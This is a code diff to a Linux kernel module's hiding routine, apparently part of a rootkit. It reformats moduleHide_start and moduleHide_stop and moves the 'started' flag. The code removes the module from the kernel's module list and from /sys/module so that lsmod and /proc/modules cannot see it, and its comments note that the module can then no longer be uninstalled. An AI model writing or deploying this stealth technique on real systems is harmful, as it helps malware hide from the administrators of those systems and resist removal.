@@ -14,25 +14,29 @@ static bool started = false;
 
 
 int moduleHide_start(void) {
-   if (started) return 0;
+	if (started) return 0;
+	started = true;
+
 	// Removes module structure from kernel module list structure, which in turn hides it from 
 	// /proc/modules and lsmod.
 	// While it is absent form the list, the module can't be uninstalled anymore.
 	prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-   // Hide from /sys/module
-   kobject_del(&THIS_MODULE->mkobj.kobj);
-   list_del(&THIS_MODULE->mkobj.kobj.entry); 
-   started = true;
+	// Hide from /sys/module
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+
 
 	return 0;
 }
 
 // TODO: Add the kobject back too
 void moduleHide_stop(void) {
-   if (!started) return;
+	if (!started) return;
+	started = false;
+
 	list_add(&THIS_MODULE->list, prev);
-   started = false;
+	// entires in /sys/module are not restored
 }
 
 
